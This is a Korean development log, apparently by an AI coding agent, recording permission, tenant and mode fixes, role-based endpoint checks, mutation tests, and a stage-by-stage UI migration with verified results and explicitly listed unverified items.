**★★★ §10 UI 3항에서 마지막 격차가 나왔다.** 「현재 회사·조직·모드가 화면에서 **항상** 확인
가능하다」 — 실측하니 허브 화면 11개 중 **조직·모드를 함께 보여주는 것은 Agent Governance
하나**뿐이었다(6개는 둘 다 없고 4개는 조직만).

⚠️⚠️ 이것이 왜 위험한가: `VIRTUAL`(가상 조직/샌드박스)에서는 **같은 화면이 다른 데이터**를
보여준다. 모드 표시가 없으면 사용자는 연습용 숫자를 실적으로 읽고 그 위에서 결정한다.

→ 화면마다 넣지 않고 **`HubDialog` 셸에 한 번** 넣었다. 화면마다 각자 그리게 두면 새 화면이
  생길 때마다 하나씩 빠진다 — 그 파일 머리말이 `role="dialog"` 에 대해 말한 것과 같은 이유다.
  REAL 은 조용히, **VIRTUAL 은 경고색으로** 적는다(둘을 같은 무게로 그리면 경고가 되지 않는다).

실측: 11/11 화면에 문맥 표시(누락 0) · VIRTUAL 전환 시
「⚠️ VIRTUAL — 가상 문맥입니다 · 조직 MNM_BATTERY · tenant_default」가 경고색으로 표시된다.

### ✅ P2-4 완료 — 확인한 축과 **확인하지 않은 축**

| §10 UI 요구 | 결과 |
|---|---|
| 역할별로 버튼·설명·목록이 서버 권한과 일치 | ✅ 관리자·manager·member·viewer 4역할 전 화면 |
| 403 을 클릭 후 처음 알게 되는 경로가 없다 | ✅ 2건 발견·수정(크로스워크·Agent Governance) |
| 회사·조직·모드가 항상 확인 가능 | ✅ 셸에 넣어 11/11 |
| 조회 실패·권한 없음·0건·배치 없음이 다른 상태 | ✅ 1건 발견·수정(404 은폐 오표시) |

⬜ **확인하지 않은 것**: 익명은 목록이 401 이라 화면 안 버튼까지 보지 못했고(메뉴 단계에서
막힌다), 쓰기 버튼을 **실제로 눌러 본 것은 아니다**(운영 DB 쓰기 금지 — 서버 판정은 코드와
격리 DB 테스트로 대조했다). 이 둘은 격리 환경에서 쓰기까지 도는 검사가 있어야 닫힌다.

### ★★★ 실행 문맥 — 가상에서 만든 것이 실제가 되고 있었다 (2026-08-08 저녁 · 완료기준 ③)

설계 §11 완료 기준 ③ 은 「Agent·Skill·Workflow·Pack 이 **명시적** tenant/scope/mode 와 버전을
가진다」인데, scope·버전만 있고 **tenant·mode 는 비어 있었다.** 라우트가 `create` 에 그 둘을
넘기지 않아 무엇을 만들든 `tenant_default`·`REAL` 이 박혔다.

⚠️⚠️ 같은 날 낮에 `HubDialog` 에 「⚠️ VIRTUAL — 가상 문맥입니다」를 띄워 놓고, **정작 그 문맥에서
만든 자산은 실제 자산이 되고 있었다.** 화면은 경고하는데 서버가 그 경고를 무시한 상태다.

**고친 것** — 기록과 조회를 **함께** 넣었다(기록만 나뉘고 조회가 안 나뉘면 「분리했다」는 착각이
생기고, 그 착각 위에서 사람들이 자산을 만든다):
· 생성·복사가 요청 문맥의 `tenant_id`·`entity_mode` 를 **기록**한다
· 목록·사용집계·**가려진 수의 분모**가 같은 축으로 걸러진다
· 방향은 설계 §7.1(가상 조직 = 실제 조직의 복제본)을 따른다:
  **REAL 문맥 → REAL 만** / **VIRTUAL 문맥 → 그 모드 ＋ REAL**(복제본이므로 원본이 보여야
  하고, 그러지 않으면 가상에서는 복사할 원본이 없어 아무것도 못 만든다)

★ 프론트는 **이미 준비돼 있었다** — P2-1 인터셉터가 `X-Entity-Mode` 를 붙이고 있었고 서버만
  그것을 안 쓰고 있었다. 「배선을 먼저 둔다」는 그때 판단이 여기서 값을 했다.

**★★ 오전에 넣은 «한계 고정» 테스트가 제 역할을 했다.** 「테넌트 경계가 생겼다면 이 테스트를
뒤집고 `hidden_count` 도 함께 확인할 것」이라고 적어 뒀는데 이 작업에서 정확히 그것이 깨졌다.
지시대로 뒤집고 분모까지 잠갔다 — **조용히 남는 한계는 시간이 지나면 «원래 그런 것» 이 된다.**

⚠️ **테넌트는 여전히 «문맥 분리» 이지 «통제» 가 아니다.** tenant·mode 는 요청자가 헤더로 보내는
값이고 사용자 레코드에 테넌트 축이 없다. 모드는 그나마 안전한 방향이다(REAL→VIRTUAL 로 넓히려면
가상 문맥 진입 자체가 §4.3 capability token 을 지나고, 반대는 좁아지기만 한다).
⬜ 테넌트를 **통제**로 만들려면 사용자에게 테넌트를 부여해야 한다 — 설계 결정이다.

⬜ 앱 전달·의사결정·발간 라우트가 **수정 전에 익명에게 열려 있었는지는 측정하지 않았다**
(추론일 뿐이다 — 그 상태의 서버를 다시 띄우지 않았다). 지금 401 인 것과 변이 A 가 테스트로
잡힌 것까지가 확인된 사실이다.

### 역할별 실측 (2026-08-08) — **여기서 서버 결함 1건이 나왔다**

시드 계정 다섯(관리자 `hikwon@lsmnm.com` · manager `hikwon_7` · member `hikwon_2` ·
viewer `hikwon_17` · 익명)으로 대표 조회 12경로를 **읽기만** 찔렀다(쓰기는 찌르지 않는다 —
막히지 않으면 그대로 실행된다).

```
경로            관리자  manager  member  viewer   익명
거버넌스 콘솔    200/5     403     403     403    403
에이전트 집계    200/7   200/7   200/7   200/7  200/7   ← 이것만 갈라져 있었다
자산 위생        200/5     403     403     403    403
```

★★★ **`/telemetry/agents` 만 `assert_governance_readable` 이 빠져 익명에게 200 이 나갔다.**
거버넌스 콘솔은 화면 하나가 아니라 셋이고, **하나만 열려 있으면 그 하나로 다 보인다.**
→ 관문을 붙이고 **세 화면이 같은 관문을 쓰는지 검사하는 테스트**를 넣었다.

### 수용 기준 「403 을 클릭 후 처음 알게 되는 경로가 없어야 한다」 — 위반이었다

viewer 에게 「데이터 거버넌스」 메뉴가 **활성으로 보였고** 눌러야 403 을 알았다.
열어 보고 나서 「권한 없음」을 읽는 것은 통제가 아니라 **헛걸음**이다.
→ `NavItem.disabledReason` 으로 **누르기 전에** 이유가 같은 자리에서 읽힌다.

⚠️ **서버 규칙을 화면에 다시 적지 않았다.** 판정은 `lib/actingScope.governanceBlockReason()`
  한 곳이고 조건·문구를 `api/deps.governance_block_reason` 과 맞췄다. 화면이 자기 규칙을
  만들면 「버튼은 보이는데 서버는 거부」가 생기고, 그때 사용자는 통제가 고장났다고 읽는다.

**충족을 확인한 것**: 조회 실패·권한 없음·0건·배치 없음이 **서로 다른 상태**로 표시된다
(거버넌스 콘솔이 viewer 에게 지표마다 「권한 없음」을 쓴다 — 0 이 아니다).
재실측에서 세 형제 화면이 전부 `관리자 200 / 나머지 403` 으로 일치. 관리자는 막히지 않는다.

⚠️ **역할별 화면 래스터 감사 전체는 여전히 Antigravity 몫이다**(설계 §12). 여기서 한 것은
  서버 축 실측과 그 결함 수정이며, 화면의 버튼·설명·목록을 역할마다 전수 대조한 것이 아니다.

⚠️ **남은 2건은 내 몫이 아니다** — 설계 §12 가 「Codex: Agent Governance Center 정보구조·
권한 상태 UI, 역할별 래스터 감사 / Antigravity: 교차검증」으로 배정했고, 내 몫은 「P0 서버
봉합, P1 저장소/API, **P3 런타임·테스트**」다. 진척을 2/4 로 두는 것이 정확하다.

### 완료 기준 ⑤ 는 내 몫이었고, 비어 있었다 (2026-08-08)

§11-5: 「관리자·manager·member·viewer·익명, **REAL·VIRTUAL 조합 회귀 테스트가 통과**한다」.
실측하니 **VIRTUAL × 역할 조합을 검사하는 테스트가 0건**이었다 — 두 축을 각각 검사한 파일은
있는데(`test_agent_config_gate` 역할, `test_e3_virtual_sandbox` 모드) **교차 지점이 비었다.**

→ `tests/test_role_mode_matrix.py` (36건). 지키는 계약은 하나다:

    entity_mode·tenant_id 는 요청 값 «해석» 에만 쓰인다. 주체의 범위 계산에는 넣지 않는다.

★★★ 왜 위험한가: 그 둘은 요청자가 **헤더로 스스로 보내는 값**이다(`X-Entity-Mode`·
`X-Enterprise-Tenant`). 범위 계산이 그것을 본다면 viewer 가 **헤더 한 줄로** 다른 조직을
열람한다 — 서버 코드를 고치지 않고도 통제가 무너지는 형태다.

⚠️ 단언은 **부분집합(⊆)이지 상등(=)이 아니다.** 문맥에 따라 좁아지는 것은 정당하다
(가상에서 더 막을 수 있다). 상등으로 못박으면 그 정당한 강화가 테스트를 깨고, 사람은
테스트를 고친다.

### ★★ 변이 검사가 내가 쓴 허수 검사를 잡았다

두 변이를 넣었다.
· `entity_mode` 로 범위를 넓히는 변이 → **5건 실패** ✅
· fail-closed 를 fail-open(`return ["*"]`)으로 바꾸는 변이 → **통과해 버렸다** ❌

`eff.denied` 만 봤기 때문이다. 멤버십 판정이 `"node_q" in ["*"]` 라 와일드카드를 펼치지 않아
**결함이 있어도 denied 가 True** 였다 — 「거부됐다」는 사실은 fail-closed 의 증거가 되지
못한다. 계약 자체(**빈 집합**)를 단언하도록 고치니 4건이 잡힌다.

★ 이번 세션에서 같은 유형을 두 번 겪었다(P4-4 의 키 규약도 대역이 자기 자신과 합의했다).
  **「테스트가 통과한다」와 「테스트가 무언가를 지킨다」는 다르다** — 변이를 한 번 넣어 보는
  것이 그 둘을 가르는 유일한 방법이다.

**P2-1 — 서버는 읽고 있었는데 화면이 보내지 않았다.**
`api/deps.current_enterprise_context` 는 이미 `X-Enterprise-Tenant`·`X-Enterprise-Scope`·
`X-Entity-Mode` 를 읽는다. 그런데 프런트는 **`X-Factory-User` 하나만** 보내고 있었다. 그래서
서버는 늘 「요청자의 소속 부서」로 되돌아갔고, 전환기를 만들어도 아무 일도 일어나지 않을
상태였다. → `lib/api.ts` 한 곳에 컨텍스트를 두고 인터셉터와 `apiUrl()`(SSE·iframe 용 쿼리)이
같은 값을 본다.
★ 배선을 먼저 둔 이유: 전환기부터 만들면 화면마다 자기 헤더를 붙이게 되고, 그것이 `api.ts`
머리말이 경고한 «같은 백엔드를 8곳에서 다르게 부르는» 상태의 재현이다. 그때 증상은
「어떤 화면은 범위가 먹고 어떤 화면은 안 먹는다」이며 사용자는 통제가 고장났다고 읽는다.

실측: 서버가 세 헤더를 문맥으로 파싱하는 것 확인(`tenant_default`/`MNM_BATTERY`/`REAL`).
브라우저에서 백엔드 호출 시 **CORS 프리플라이트가 발생** — 커스텀 헤더가 실려 나간다는 증거다.
⬜ 프리플라이트의 헤더 이름 목록까지는 읽지 못했다.

**P2-3 — 추천이 «가능한 것» 을 모르는 채 설계하고 있었다.**
`POST /ai-recommend/pipeline` 은 사용자 문장 하나만 LLM 에 넘겼다. 그래서 존재하지 않는
데이터와 접근할 수 없는 도구를 전제로 설계됐고, 결과는 둘 중 하나였다 — 실행 단계에서 권한
교집합(P3-3)에 걸려 죽거나, 통제 없는 경로로 흘러 권한 밖 자원을 건드리거나.
→ `core/agent_design_context.py` 가 커넥터·참조 데이터·지식팩을 모아 프롬프트 앞에 붙인다.
통제를 «사후 거부» 에서 «사전 안내» 로 옮긴 것이다.

★★ **핵심은 「모르면 «없음» 이라고 말하지 않는다」다.** LLM 은 빈 목록과 «모름» 을 구분하지
못한다. 「도구가 없습니다」라고 쓰면 모델은 도구 없이 설계하거나 도구를 지어낸다. 그래서 세
상태를 문장으로 가른다 — `[]` 「확인했고 없습니다」 / `[...]` 목록 / `None` 「확인하지 못했습니다」.

⚠️ **이 작업 중에 그 함정에 내가 먼저 빠졌다.** 모듈 이름을 `core.knowledge_hub` 로 잘못
적었는데(정본은 `core.knowledge_base`) `_safe` 가 `ImportError` 를 삼켜 프롬프트에
「지식 허브를 읽지 못했습니다」가 나갔다 — **틀린 이유를 그럴듯하게 말하는** 상태이고, 그런
오류는 아무도 고치지 않는다. → 이름·속성 오류는 「🐞 수집기 버그」로 로그에 남기고,
`tests/test_agent_design_context.py` 가 세 수집기의 import 가 실제로 풀리는지 확인한다.

### P1 상세 (완료)

1. ✅ 버전형 Agent/Skill/Workflow 테이블 (`core/agent_assets.py`)
2. ✅ 기존 파일 자산을 SYSTEM·LEGACY adapter 로 노출 (`core/agent_asset_adapter.py`, 54개)
3. ✅ 역할·capability 해석(가시성 판정)
4. ✅ 조직별 목록·복사·승인·폐기 API (`api/routes/agent_governance.py`, 11 엔드포인트)
5. ✅ 기존 `/agents`·`/templates` 를 adapter 로 전환(응답 형태 불변)

### P0 상세 (완료)

1. ✅ Agent/Template/Recommend API 요청자 식별·권한 검사
2. ✅ 스킬 파일 경로 검증, 공용 파일 덮어쓰기 차단
3. ✅ 전역 reset·default 수정을 플랫폼 관리자 전용으로
4. ✅ Agent Pack 목록·상세·resolve 범위 필터와 404 은폐
5. ✅ 권한 강제 모드의 미바인딩 fallback 차단
6. ✅ 감사 이벤트와 회귀 테스트

> 선행 작업 `[ADMIN-CAP-40]`(관리자 capability 계약)은 P0 의 전제였고 별도로 세지 않는다.

## C. 화면 이관 10단계 — **10/10 (2026-08-05 병합 완료)**

| # | 화면군 | 상태 |
|---|---|---|
| 1 | 지식 허브 | ✅ |
| 2 | MDM 기준정보 | ✅ |
| 3 | 업무표준 | ✅ |
| 4 | 조직·권한 관리 | ✅ |
| 5 | 데이터 거버넌스 | ✅ |
| 6 | 에이전트 통제소 | ✅ |
| 7 | 프로젝트 관리 | ✅ |
| 8 | 스킬 진화 | ✅ |
| 9 | 전사 브리핑 | ✅ |
| 10 | 런처 | ✅ |

실측 근거: `HubDialog` 를 쓰는 화면 수. `claude/nice-hawking-f8b4bf` → `dev` 병합으로 3~10 이
들어왔다(커밋 `d780a87f1` + 회귀 교정).
⚠️ **여기서 «완료» 는 «이관됐다» 는 뜻이고 «시각 승인을 받았다» 는 뜻이 아니다.** 감사 캡처는
아래 «시각 승인 대기» 항목에 그대로 남아 있다 — 트랙 F(추가 8화면)와 함께 확인해야 한다.

## D. ECM 정본 이행 D-018 — 10/10 완료

정본은 `organization_nodes.node_id`(`.agents/DECISIONS.md` `[D-018]`).

| # | 항목 | 상태 |
|---|---|---|
| 1 | ECM·Master DB 경로 절대경로 고정 | ✅ (상대경로 21곳) |
| 2 | `resolve_scope_ref(ref, tenant_id, entity_mode)` 계약 통합 | ✅ |
| 3 | API 입력에서 3형태 허용(과도기) | ✅ |
| 4 | API 경계에서 `node_id` 정규화 + 표시용 코드·이름 | ✅ |
| 5 | 기존 코드값 백필 | ✅ 49건 (불변 이력 513건은 **의도적 제외**) |
| 6 | 신규 쓰기 `node_id` 강제 | ✅ |
| 7 | 코드 별칭·변경이력 + tenant·mode 유일성 | ✅ |
| 8 | 미해석·복수 후보 Fail-closed | ✅ (해석·경계·판정·저장 전 계층) |
| 9 | `readable_scope_nodes` 우선 우회 유지 | ✅ (백필 완료 전까지 제거 금지) |
| 10 | 백업·복원·시드에서 `node_id` 보존(재생성 금지) | ✅ |

> ⑩ 실측: 노드를 **지우는 코드 경로가 없다**(상태 변경으로만 폐지) · 백업·복원은 ECM 을 건드리지
> 않는다 · `seed_example_organization(force=True)` 가 새 id 를 만들려 하던 것을 고쳤다(9/9 보존,
> 엔티티 증가 0). ⚠️ 그 결함은 ⑦(코드 유일성)이 `EcmError` 로 **막아서 드러났다** — 종전에는
> 같은 코드의 노드가 하나 더 생기고 그 뒤 코드 해석이 «모호» 로 거부됐을 것이다.

## E. SW Factory Studio 재구축 (Concept E) — 6.5/7

**담당: Claude Code**(`[UX-SW-FACTORY-ADAPTIVE-37]` — «선택사항 아님»).
기준: `docs/uiux/SW_FACTORY_ADAPTIVE_PRODUCTION_STUDIO_IMPLEMENTATION_SPEC_2026-08-04.md` §7.
시각 SSOT: `uiux-prototypes/sw-factory-concepts/adaptive-production-studio/`.

| # | 항목 | 상태 |
|---|---|---|
| 1 | Factory API/SSE 를 읽는 `factoryViewModel` | ✅ (`3676cdd0b`) |
| 2 | Production Stage Map + WBS Spine 을 기존 화면과 **병행 렌더** | ✅ |
| 3 | Adaptive Canvas — 요구 확인·구현/실행 두 극단 먼저 | ✅ |
| 4 | Decision/Jarvis Dock 연결 | ✅ |
| 5 | Context Inspector 로 Timeline·근거 이식 | ✅ |
| 6 | RFP·기획·아키텍처·WBS·검증·Release Canvas 순차 이식 | ✅ |
| 7 | 기능 회귀·시각 게이트 통과 후 기존 3패널 제거 | ◐ **전환 게이트 0/0/0 통과**(2026-08-07) · 기본 route 승격은 사용자 승인 대기 |
| +  | (§2.1) Project Header — 실행 상태·지표·일시정지 | ✅ 7단계 전제로 추가 |

### 2단계 실측 (2026-08-05, 헤드리스 Chrome · 1440×900 · 1280×720)

| 항목 | 결과 |
|---|---|
| 단계 지도가 **실제 레지스트리** 기반인가 | ✅ 프로젝트에 따라 14칸·16칸으로 달라진다(하드코딩 8칸이 아니다) |
| WBS 0개를 «만들기 전» 으로 말하는가 | ✅ «아직 WBS를 만들지 않았습니다 — 작업 0개와는 다릅니다» |
| 선택 ≠ 현재 | ✅ 과거 단계를 눌러도 진행 표시가 옮겨가지 않는다 |
| 가로 넘침 | ✅ 두 해상도 모두 **0px** |
| 12px 미만 가시 텍스트 | ✅ **0건** |
| 콘솔 오류 | ✅ **0건** |
| Escape 로 종전 통제실 복귀 | ✅ |

⚠️ **「선택 ≠ 현재」 검증은 아직 약하다.** 실행 중인 프로젝트가 없어서 «진행» 단계가 0개인
상태로 확인했다 — 즉 «옮겨가지 않았다» 가 «옮길 것이 없었다» 일 수 있다. 실행 중 프로젝트로
다시 확인해야 하며, 그것은 Sprint 를 돌리는 일이라 사용자 승인이 필요하다.

⚠️ **콘솔 오류 판정 기준을 정했다.** 403·401 은 통제가 작동한 것이고 브라우저는 그것도 콘솔
오류로 적는다. 그것을 게이트에 넣으면 «권한 통제가 있는 화면» 은 영원히 통과하지 못하고,
그러면 사람이 게이트를 끈다. 그래서 401/403·연결 거부·App-in-App iframe sandbox 경고는
**분류해서 제외**하고 나머지는 전부 실패로 센다(숨기는 것이 아니라 세는 대상을 밝히는 것이다).

### 3단계 실측 (2026-08-06 · `test_a1_unitconv` 로 세 경로 확인)

이 프로젝트가 **두 극단을 다 갖고 있어** 한 프로젝트로 검증했다 — 요구 확인 질문 3개(요약
231자 완료 상태) + 생성 코드 14,188자, 현재 단계는 코드 심사.

| 항목 | 결과 |
|---|---|
| 요구 확인 Canvas | ✅ 요약이 있으면 «요구 확인이 끝났습니다» + 확정 요약 하나 |
| 구현 Canvas | ✅ **생성된 앱이 실제로 실행된다**(iframe 안에 「단위 변환기」 렌더) |
| 미이식 단계 | ✅ «무엇이 올 예정 + 지금 어디서 보는지» 를 말한다(11단계 전부 매핑) |
| 선택 ≠ 현재 | ✅ «지난 단계를 보고 있습니다 — 실행 중인 단계는 코드 심사입니다» |
| 가로 넘침 · 12px 미만 · 콘솔 오류 | ✅ 두 해상도 모두 0 / 0 / 0 |

**이 단계에서 잡은 결함 2건** (둘 다 2단계 검증에서는 드러나지 않았다):

1. **`small` 태그가 9.6px 이 됐다.** 브라우저 기본이 부모의 80% 라서 12px 컨테이너 안에서
   9.6px 가 된다(§6 위반). 2단계에서는 WBS 가 비어 있어 그 요소가 렌더되지 않았고, 실제 WBS 가
   들어오자 8건이 걸렸다. → 규칙마다 `font-size` 를 적는 대신 `.afs-studio small { 12px }`
   하나로 되돌렸다. 개별 규칙으로 막으면 다음에 추가되는 `small` 에서 또 빠진다.
2. **단계 라벨이 에이전트 한 명 이름이었다.** `EXECUTION` 은 백엔드·프론트엔드가 **함께** 쓰는데
   화면에는 「백엔드 개발자」만 나왔다 — 프론트엔드가 그 단계에 없는 것처럼 보인다.
   → 단계명은 용어 사전 `STAGE_KO`(「구현」), 담당 에이전트는 셋째 줄에 따로 표시한다.

⚠️ **아직 확인하지 못한 것**: 요구 확인 «대기» 상태(질문 카드가 실제로 뜨는 경로). 지금 있는
프로젝트는 모두 요약이 이미 채워져 있다. 코드 논리로만 확인했고, 그 상태의 프로젝트가 생기면
재확인해야 한다 — 2단계의 「선택 ≠ 현재」와 같은 성격의 미완 검증이다.

### 4단계 실측 (2026-08-06)

| 항목 | 결과 |
|---|---|
| 결정 0건이면 Decision Dock **완전 접힘** | ✅ 요소가 아예 렌더되지 않는다(§2.3) |
| Jarvis 는 하나만 | ✅ Dock 하나 · 기존 `jarvisSession`(모듈 스코프 이력) 공유 |
| Task ID 를 요구하지 않는가 | ✅ 입력칸 1개(질문만) · 서버 계약도 `task_id_required: false` |
| 문맥 자동 인계 | ✅ 「«코드 심사» 문맥으로 답합니다」 — 단계·선택 작업·WBS 차단수·앱 실행 가능 여부를 싣는다 |
| 긴 대화 Drawer | ✅ 열고 닫힌다(Canvas 를 영구히 좁히지 않는다) |
| 접힘 시 Canvas 높이 | ✅ 573px — Dock 이 먹지 않은 공간을 Canvas 가 가져간다 |
| 가로 넘침 · 12px 미만 · 콘솔 오류 | ✅ 두 해상도 모두 0 / 0 / 0 |

**답변 직렬화를 한 곳으로 모았다.** `[요구 확인 인터뷰 답변]` / `N. 질문` / `→ 선택: …` 형식은
**백엔드(`RFP_Analyst`)가 파싱하는 계약**이다. 종전에는 `components/HOTLInput.tsx` 안에만
있었고 Dock 이 같은 제출을 하려면 복사해야 했다 — 이 저장소에서 «형식이 두 벌이 되면 갈라진다»
를 여섯 번 확인했으므로 `factory/clarifyAnswers.ts` 로 추출하고 **양쪽이 부른다**.
⚠️ 형식을 바꾸면 백엔드 파서도 함께 봐야 한다. 화면만 고치면 답변이 **오류 없이 «선택 없음»
으로 읽힌다** — 가장 찾기 어려운 종류의 결함이다.

⚠️ **확인하지 못한 것 3가지** (모두 «HOTL 대기» 프로젝트가 없어서다):
· Decision Dock 이 **표시**되는 상태(결정 1건 이상). 접힘만 확인했다.
· 「제출하고 재개」의 실제 동작 — 누르면 **파이프라인이 재개된다.** 사용자 승인 사안이다.
· 「질문하기」의 실제 응답 — 누르면 **LLM 을 호출해 회사 비용이 나간다.**
→ 렌더·접힘·토글만 확인했고, 제출 경로는 기존 `HOTLInput` 과 **같은 엔드포인트·같은 직렬화**
  라는 것으로 담보한다(다르게 보내면 백엔드가 한쪽만 이해하므로 그 위험이 가장 컸다).

### 5단계 실측 (2026-08-06) — 그리고 **여기서 3단계의 오표시를 잡았다**

| 항목 | 결과 |
|---|---|
| 두 입구(「근거·상태」·「의존관계 보기」)로 열린다 | ✅ 둘 다 |
| **Canvas 폭을 영구 축소하지 않는다** | ✅ 닫힘 1202px · 열림 1202px (오버레이) |
| **스크롤 위치 유지** | ✅ 120px → 닫고 다시 열어도 120px (언마운트하지 않는다) |
| 선택 문맥 유지 | ✅ 여닫아도 선택한 단계가 그대로 |
| 닫힌 동안 `aria-hidden` | ✅ 보조기기가 읽지 않는다 |
| 가로 넘침 · 12px 미만 · 콘솔 오류 | ✅ 두 해상도 모두 0 / 0 / 0 |

★★★ **WBS 진행 상태가 틀리게 표시되고 있었다** — 3단계 스크린샷에 이미 있었는데 놓쳤다.

화면은 「완료 2 · **진행 0** · 대기 3(**차단 3**)」이라고 말했지만 실제 데이터는
완료 2 · **진행 1** · 대기 1 · 차단 1 이었다. 원인은 **판정이 두 벌**이었던 것:

· `WbsSpine` 은 `status` 를 보고 종류를 정했다 — `'COMPLETED' || 'DONE'` 둘 다 완료로 인정.
· `factoryViewModel` 은 `blockedBy` 를 따로 계산했다 — `!== 'COMPLETED'` 만 비교.
· **실제 데이터는 `'DONE'`** 이었다. 그래서 ViewModel 은 끝난 선행을 «미완» 으로 세고, 완료·
  진행 중인 작업에까지 `blockedBy` 를 붙였다. `WbsSpine` 은 완료를 먼저 보므로 「완료」로,
  Inspector 는 `blockedBy` 만 보므로 「차단」으로 — **같은 작업이 두 곳에서 다르게 보였다.**

→ 완료 판정을 `isTaskDone()` 하나로 모으고, 종류(`kind`)를 **ViewModel 에서만** 정한다.
  컴포넌트는 표시만 한다. Inspector 의 「무엇이 막고 있는가」에는 `kind === 'blocked'` 만 넣는다 —
  완료·진행 중인 작업을 넣으면 「완료했는데 막혀 있다」는 모순이 화면에 동시에 보인다.

⚠️ 이 결함이 왜 늦게 잡혔나: **두 표시가 서로 모순인데 각각은 그럴듯했다.** 「차단 3」도
말이 되고 「완료」도 말이 됐다. 나란히 놓고 실제 JSON 과 대조해야 드러난다 — 그래서 5단계에서
Inspector 가 같은 데이터를 다른 각도로 보여 주자 비로소 보였다.

### 6단계 실측 (2026-08-06 · 14개 단계 칸을 하나씩 눌러 확인)

`test_a1_unitconv` 로 **세 부류를 각각** 확인했다 — 12개 단계 전부 기대와 일치.

| 부류 | 단계 | 결과 |
|---|---|---|
| 문서가 있다 | 요구사항 정의(1397자) · 사업 기획(215) · 시스템 설계(1121) · 기술 명세(2017) · 코드 심사(51) | ✅ 마크다운 렌더 |
| 아직 없다 | 품질 검증 · 총괄 감독 · 매뉴얼 작성 | ✅ «지금 비어 있는 것은 «아직»이며 «서버가 주지 않는다»가 아닙니다» |
| **서버가 안 준다** | 화면 설계 · 화면 검증 | ✅ «기다려도 이 자리에는 생기지 않습니다» |
| 구조 | 진행 관리(WBS) | ✅ 의존관계·배정 표 |
| 실행 | 구현 | ✅ 생성 앱 iframe |
| 가로 넘침 · 12px 미만 · 콘솔 오류 | 두 해상도 | ✅ 0 / 0 / 0 |

**여섯 Canvas 를 여섯 컴포넌트로 만들지 않았다.** §2.2 의 여섯 행은 «무엇을 보여 주는가» 만
다르고 구조는 같다(문서 + 판정 + 보조 검토). 여섯 벌이면 「없는 것을 어떻게 말하는가」 규칙이
여섯 곳에 흩어지고 그중 한 곳만 고쳐진다 — 그래서 **표로 선언하고 렌더는 한 번**, 정말 다른
둘(WBS 표·Release 목록)만 분기했다.

**보조 검토를 지어내지 않았다.** 명세는 「변경점」·「RFP 대비 Diff」·「영향 분석」·「수정 전후」를
요구하지만 서버가 재료를 주지 않는다. 빈 탭을 만드는 대신 **무엇이 없는지** 적었다
(예: «RFP 대비 Diff 는 아직 없습니다 — 두 문서의 차이를 서버가 계산해 주지 않습니다»).

★ **이 단계에서 잡은 결함**: `UI_DESIGN`·`VISION_QA` 를 산출물 집합에서 빼 두었더니
「작업면이 아직 이 화면에 없습니다 — 올 예정입니다」로 나갔다. **그것은 거짓이다** — 서버가 그
단계 요약을 주지 않으므로 기다려도 생기지 않는다. 「아직」과 「없다」를 두 컴포넌트가 나눠
판정하면 이렇게 어긋난다 → 둘도 산출물 집합에 넣고 판정을 한 곳으로 모았다.

### 7단계는 아직 할 수 없다 — 전제를 표로 확인했다 (2026-08-06)

§8 **기능 게이트**가 「Sprint 시작·일시정정·정지·재개·복구·재분할·Release·Export 가 보존된다」를
요구한다. 지금 3패널을 지우면 아래 ⬜ 가 **사라진다** — 명세가 금지한 「기존 3패널 선삭제」다.

| §8 기능 게이트 항목 | 신규 Studio | 비고 |
|---|---|---|
| 일시정지 | ✅ | Project Header (`stopSprint` 재사용) |
| 현재 결과 검토 | ✅ | Project Header → 구현 Canvas |
| HOTL 질문·승인·수정 요구 | ✅ | Decision Dock (같은 엔드포인트·같은 직렬화) |
| SSE 재연결·REST 최신 상태 복구 | ✅ | store 가 담당하므로 자동 보존 |
| 앱·보고서·산출물 열기 | ✅ | 구현 Canvas + 산출물 Canvas 8종 |
| 코드·테스트·추적성 | ✅ | 구현 Canvas 안의 기존 `PreviewPanel` 탭 |
| **Sprint 시작** | ⬜ | 아이디어 입력 + `project_state_payload` 조립이 얽혀 있다(`ControlPanel:234`) |
| **재개(쿼터 회복)** | ⬜ | `resume-quota` 미배선 |
| **복구(자가치유 재시도)** | ⬜ | `triggerSelfHealing` 미배선 |
| **WBS 재분할** | ⬜ | `wbs/replan` 미배선 |
| **Release 저장·Export** | ⬜ | Release Canvas 는 **목록만** 보여 준다 |

→ 7단계는 위 5개를 옮긴 뒤에야 시작할 수 있다. **지금 옮기지 않은 이유**: Sprint 시작은 두
화면이 서로 다른 `project_state_payload` 를 보낼 위험이 가장 큰 경로다(스키마 버전·모드·
master_data 를 조립한다). 그것을 급하게 복사하면 「두 화면이 다른 프로젝트를 만든다」가 된다.

⚠️ §8 **전환 게이트**도 남았다: 「병행 카나리에서 기존 화면과 **동일 프로젝트 상태를 비교**한다」·
「기능 누락·상태 불일치·작업 보호 실패가 **0건일 때만** 기본 route 로 승격」. 위 표가 곧 그
비교의 시작이며, 지금은 **기능 누락 5건**이다.

### ★★★ 7단계 전환 게이트 실측 (2026-08-07) — 게이트가 **4건을 잡았다**

전제 5건은 `878904ed1` 로 채워졌다(위 표의 ⬜ 는 그 커밋 이전 상태다). 그래서 **전환 게이트를
실제로 돌렸다** — 같은 프로젝트(`test_a1_unitconv`)를 **두 화면 + 서버 원본** 3자로 대조했다.

| 항목 | 1차 | 재판정 |
|---|---|---|
| 기능 누락 | **2** | 0 |
| 상태 불일치 | **1** | 0 |
| 작업 보호 실패 | **1** | 0 |

**① 기능 누락 2건**
· **Export** — `StageArtifactCanvas` 가 스스로 「종전 통제실에서 하십시오」라고 적어 두었다.
· **피드백 백로그 발행**(`POST /sprint/revision` · Track 2 고객 리뷰 → WBS 추가) — 아예 없었다.

**② 상태 불일치 1건** — HOTL 이 멈춰 세운 `E2E-03` 이 신규 WBS 척추에서 **「진행」**으로 보였다.
서버 상태가 여전히 `IN_PROGRESS` 라 그대로 쓴 것인데, 사용자는 **기계가 돌고 있다**로 읽고
자기를 기다린다는 것을 모른다. 기존 3패널은 그 줄에 「⚠️ HOTL(전문가 개입)」을 붙여 말하고
있었다 — **옮기면서 그 표시가 사라졌다.** §8 신뢰성 「실패를 실행 중으로 표시하지 않는다」와
같은 성격이라 `FactoryWbsKind` 에 `awaiting` 을 더했다(판정은 ViewModel 한 곳에서만).

**③ 작업 보호 실패 1건** — Dock 의 「승인 조건이나 수정 요청」에 쓰다가 화면을 다녀오면
입력이 사라졌다. ⚠️ **이것은 회귀다** — 기존 3패널의 같은 입력은 보존된다(언마운트되지
않는다). 즉 신규 화면으로 옮기는 순간 **사용자가 하던 일을 잃는 경로가 새로 생긴다.**
→ `factory/decisionDraft.ts` 로 초안을 화면 밖에 둔다(`jarvisSession` 과 같은 방식).

### 재판정 실측 (2026-08-07)

| 항목 | 결과 |
|---|---|
